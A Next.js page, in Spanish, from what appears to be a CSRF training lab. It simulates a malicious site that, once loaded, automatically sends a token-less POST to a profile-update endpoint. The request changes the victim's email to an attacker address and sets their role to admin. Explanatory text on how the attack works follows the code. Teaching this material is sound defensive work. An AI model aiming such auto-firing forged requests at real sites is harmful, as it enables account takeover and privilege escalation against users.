'use client';

import { useEffect, useState } from 'react';
import { useSearchParams } from 'next/navigation';

export default function CSRFAttackPage() {
  const searchParams = useSearchParams();
  const [status, setStatus] = useState('Preparando ataque CSRF...');
  const [details, setDetails] = useState('');
  const [attacked, setAttacked] = useState(false);
  
  useEffect(() => {
    // Obtener el ID de usuario del parámetro URL
    const userId = searchParams.get('userId');
    
    if (!userId) {
      setStatus('❌ Error: Falta el ID de usuario');
      return;
    }
    
    // Esta función ejecuta el ataque CSRF
    const executeAttack = async () => {
      try {
        setStatus('⏳ Ejecutando ataque CSRF...');
        
        // Los datos maliciosos que se enviarán sin el conocimiento del usuario
        const maliciousData = {
          email: 'comprometido@atacante.com',
          role: 'admin', // Intento de elevación de privilegios
          userId: userId
        };
        
        setDetails(`Enviando datos: ${JSON.stringify(maliciousData, null, 2)}`);
        
        // Realizar la solicitud POST sin token CSRF
        const response = await fetch('/api/profile/update', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(maliciousData)
        });
        
        const result = await response.json();
        
        if (result.success) {
          setStatus('✅ ¡Ataque CSRF exitoso!');
          setDetails(`Los datos del usuario han sido modificados:\n${JSON.stringify(result.data, null, 2)}`);
        } else {
          setStatus('❌ El ataque CSRF falló');
          setDetails(`Error: ${result.error || 'Desconocido'}`);
        }
      } catch (error) {
        setStatus('❌ Error durante el ataque CSRF');
        setDetails(`${error instanceof Error ? error.message : 'Error desconocido'}`);
      }
      
      setAttacked(true);
    };
    
    // Ejecutar el ataque automáticamente después de un breve retraso
    const timer = setTimeout(() => {
      executeAttack();
    }, 1500);
    
    return () => clearTimeout(timer);
  }, [searchParams]);
  
  return (
    <div className="p-8 max-w-4xl mx-auto">
      <div className="bg-red-600 text-white p-6 rounded-lg mb-6">
        <h1 className="text-2xl font-bold mb-2">⚠️ Página de Ataque CSRF</h1>
        <p>Esta página simula un sitio web malicioso que explota una vulnerabilidad CSRF.</p>
      </div>
      
      <div className="p-6 bg-white shadow-md rounded-lg mb-6">
        <h2 className="text-xl font-bold mb-4">Simulación de Ataque</h2>
        
        <div className="mb-4 p-4 bg-gray-100 rounded-md">
          <p className="font-semibold">{status}</p>
          {details && (
            <pre className="mt-2 p-3 bg-gray-200 rounded text-sm overflow-x-auto whitespace-pre-wrap">
              {details}
            </pre>
          )}
        </div>
        
        {attacked && (
          <div className="mt-6">
            <a 
              href="/lab/csrf"
              className="bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-4 rounded inline-block"
            >
              Volver al Laboratorio CSRF
            </a>
          </div>
        )}
      </div>
      
      <div className="p-6 bg-gray-50 border border-gray-200 rounded-lg">
        <h2 className="text-xl font-bold mb-4">¿Cómo funciona este ataque?</h2>
        
        <div className="space-y-4 text-sm">
          <p>
            <strong>1. Engaño al usuario:</strong> En un escenario real, esta página maliciosa podría estar
            oculta en un iframe invisible o disfrazada como un sitio legítimo.
          </p>
          
          <p>
            <strong>2. Aprovechamiento de sesión:</strong> El ataque aprovecha que el navegador envía automáticamente
            las cookies de sesión con cada solicitud al mismo dominio.
          </p>
          
          <p>
            <strong>3. Solicitud no autorizada:</strong> Cuando esta página se carga, ejecuta automáticamente una
            solicitud POST al endpoint vulnerable sin necesidad de interacción del usuario.
          </p>
          
          <p>
            <strong>4. Ausencia de protección CSRF:</strong> Como el endpoint no valida la presencia de un token CSRF,
            acepta la solicitud como válida aunque provenga de un origen diferente.
          </p>
          
          <p>
            <strong>5. Resultado:</strong> Si la protección CSRF está desactivada en la página del laboratorio,
            la información del usuario se modificará sin su consentimiento.
          </p>
        </div>
      </div>
    </div>
  );
}